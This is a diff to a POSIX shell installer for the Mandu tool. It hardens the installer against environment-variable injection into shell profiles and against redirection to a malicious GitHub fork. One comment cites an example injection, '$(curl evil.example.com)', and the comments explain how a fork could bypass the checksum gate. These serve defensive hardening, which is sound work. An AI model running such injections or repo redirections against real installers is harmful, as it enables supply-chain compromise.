@@ -12,6 +12,10 @@
 #   MANDU_VERSION       Release tag to install (default: "latest").
 #   MANDU_INSTALL_DIR   Where to place the binary (default: $HOME/.mandu/bin).
 #   MANDU_REPO          GitHub owner/repo (default: "konamgil/mandu").
+#   MANDU_REPO_CONFIRM  Set to "yes" to acknowledge a non-default MANDU_REPO
+#                       override in non-interactive shells (e.g. `curl | sh`
+#                       piped from a CI job). Required when MANDU_REPO is
+#                       not the default.
 #   MANDU_FORCE         If "1", overwrite an existing binary without prompting.
 #   MANDU_NO_MODIFY_PATH  If "1", skip shell-profile PATH edits.
 #
@@ -21,6 +25,7 @@
 #   2  unsupported OS/arch
 #   3  download / network failure
 #   4  checksum mismatch
+#   5  unsafe env override (MANDU_REPO / MANDU_INSTALL_DIR rejected)
 #
 # This script is intentionally POSIX `sh`-compatible (no bashisms) so it can be
 # consumed by Alpine (busybox ash) and FreeBSD users in addition to GNU bash /
@@ -31,7 +36,8 @@ set -eu
 # ---------------------------------------------------------------------------
 # Defaults / constants
 # ---------------------------------------------------------------------------
-MANDU_REPO="${MANDU_REPO:-konamgil/mandu}"
+MANDU_REPO_DEFAULT="konamgil/mandu"
+MANDU_REPO="${MANDU_REPO:-${MANDU_REPO_DEFAULT}}"
 MANDU_VERSION="${MANDU_VERSION:-latest}"
 MANDU_INSTALL_DIR="${MANDU_INSTALL_DIR:-${HOME}/.mandu/bin}"
 DRY_RUN=0
@@ -75,8 +81,8 @@ Options:
   --verbose             Print extra debug output.
   --help                Show this help.
 
-Environment: MANDU_VERSION, MANDU_INSTALL_DIR, MANDU_REPO, MANDU_FORCE,
-             MANDU_NO_MODIFY_PATH.
+Environment: MANDU_VERSION, MANDU_INSTALL_DIR, MANDU_REPO, MANDU_REPO_CONFIRM,
+             MANDU_FORCE, MANDU_NO_MODIFY_PATH.
 EOF
 }
 
@@ -92,6 +98,103 @@ while [ $# -gt 0 ]; do
     *) err "unknown argument: $1"; usage; exit 1 ;;
   esac
 done
+
+# ---------------------------------------------------------------------------
+# Phase 11.B — L-02: MANDU_INSTALL_DIR character filter
+#
+# MANDU_INSTALL_DIR is injected verbatim into shell profiles via printf
+# (`export PATH="<value>:$PATH"`). A value containing shell metacharacters
+# (`"`, `$`, backtick, `;`, newline, backslash) would escape the quoted
+# context and let any shell that sources the profile execute arbitrary
+# code on next login. We require a conservative allowlist:
+#
+#   [A-Za-z0-9 / . _ -]
+#
+# Tilde is NOT on the allowlist because `$HOME` expansion already happens
+# in the default; users who need a tilde should pass the expanded path.
+# Space is also omitted — paths with spaces are technically quotable but
+# routinely mishandled by downstream scripts, so we refuse them early.
+# ---------------------------------------------------------------------------
+case "${MANDU_INSTALL_DIR}" in
+  *[!A-Za-z0-9/._-]*)
+    err "MANDU_INSTALL_DIR contains unsafe characters"
+    note "value: ${MANDU_INSTALL_DIR}"
+    note "allowed: letters, digits, '/', '.', '_', '-'"
+    note "(shell metacharacters — ; \$ \` \" ' \\ space — would let the"
+    note " profile line escape its quoted context on next login)"
+    exit 5
+    ;;
+esac
+# Additional guard: reject empty or pure-dot-segments (`.`, `..`, `/`).
+case "${MANDU_INSTALL_DIR}" in
+  ""|"."|".."|"/")
+    err "MANDU_INSTALL_DIR must be a real directory path"
+    exit 5
+    ;;
+esac
+
+# ---------------------------------------------------------------------------
+# Phase 11.B — L-01: MANDU_REPO override warning
+#
+# An attacker-controlled MANDU_REPO (via shell profile injection from a
+# prior compromise) would redirect the installer to an evil fork whose
+# SHA256SUMS.txt matches its own malicious binary, bypassing the checksum
+# gate. We refuse to proceed silently — require explicit MANDU_REPO_CONFIRM
+# when the value is non-default, and interactively prompt when stdin is a
+# TTY.
+#
+# Allowed characters for MANDU_REPO: owner/repo pattern only. This also
+# blocks `MANDU_REPO=$(curl evil.example.com)` injections.
+# ---------------------------------------------------------------------------
+case "${MANDU_REPO}" in
+  */*) ;;
+  *)
+    err "MANDU_REPO must be in owner/repo format"
+    note "got: ${MANDU_REPO}"
+    exit 5
+    ;;
+esac
+case "${MANDU_REPO}" in
+  *[!A-Za-z0-9/._-]*)
+    err "MANDU_REPO contains unsafe characters"
+    note "value: ${MANDU_REPO}"
+    note "allowed: letters, digits, '/', '.', '_', '-'"
+    exit 5
+    ;;
+esac
+
+if [ "${MANDU_REPO}" != "${MANDU_REPO_DEFAULT}" ]; then
+  log ""
+  log "${YEL}${BOLD}WARNING${RST}: MANDU_REPO override active"
+  log "  repo:    ${MANDU_REPO}"
+  log "  default: ${MANDU_REPO_DEFAULT}"
+  log ""
+  log "  Downloading the Mandu binary from a non-default GitHub repository"
+  log "  bypasses the usual provenance trail. Proceed only if you trust"
+  log "  ${MANDU_REPO} explicitly."
+  log ""
+  if [ "${MANDU_REPO_CONFIRM:-}" = "yes" ]; then
+    log "  (acknowledged via MANDU_REPO_CONFIRM=yes — continuing)"
+    log ""
+  elif [ -t 0 ]; then
+    # Interactive shell — prompt for confirmation.
+    printf '  Type "yes" to continue, anything else to abort: ' >&2
+    IFS= read -r _mandu_confirm || _mandu_confirm=""
+    case "${_mandu_confirm}" in
+      yes|YES|Yes) ;;
+      *)
+        err "MANDU_REPO override not confirmed — aborting"
+        exit 5
+        ;;
+    esac
+    unset _mandu_confirm
+  else
+    # Non-interactive (e.g. `curl | sh`) — require explicit env ack.
+    err "MANDU_REPO override in non-interactive shell requires MANDU_REPO_CONFIRM=yes"
+    note "re-run with: MANDU_REPO_CONFIRM=yes MANDU_REPO=${MANDU_REPO} sh install.sh"
+    exit 5
+  fi
+fi
 
 # ---------------------------------------------------------------------------
 # Platform detection
@@ -281,6 +384,9 @@ case ":${PATH:-}:" in
     log "  ${BOLD}export PATH=\"${MANDU_INSTALL_DIR}:\$PATH\"${RST}"
 
     if [ -z "${MANDU_NO_MODIFY_PATH:-}" ]; then
+      # NB: MANDU_INSTALL_DIR has already passed the char-filter above —
+      # at this point it cannot contain `"`, `$`, backtick, `;`, or
+      # newline, so the quoted interpolation below is safe.
       for profile in "${HOME}/.bashrc" "${HOME}/.zshrc" "${HOME}/.profile"; do
         [ -f "${profile}" ] || continue
         if ! grep -q "${MANDU_INSTALL_DIR}" "${profile}" 2>/dev/null; then
